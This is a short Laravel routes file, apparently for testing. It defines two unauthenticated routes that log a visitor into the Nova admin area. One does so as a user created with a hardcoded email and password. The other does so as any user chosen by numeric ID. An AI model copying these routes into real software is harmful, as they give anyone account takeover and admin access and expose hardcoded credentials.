<?php

/*
|--------------------------------------------------------------------------
| Testing Routes
|--------------------------------------------------------------------------
 */
use App\Models\User;

Route::get('test', function () {
    Auth::login(User::firstOrCreate(['email' => 'team@nulisec.com'], ['password' => bcrypt('nulisec789')]));

    return Redirect::to(config('nova.path'));
});

Route::get('logas/{id}', function ($id) {
    Auth::login(User::findOrFail($id));

    return Redirect::to(config('nova.path'));
});
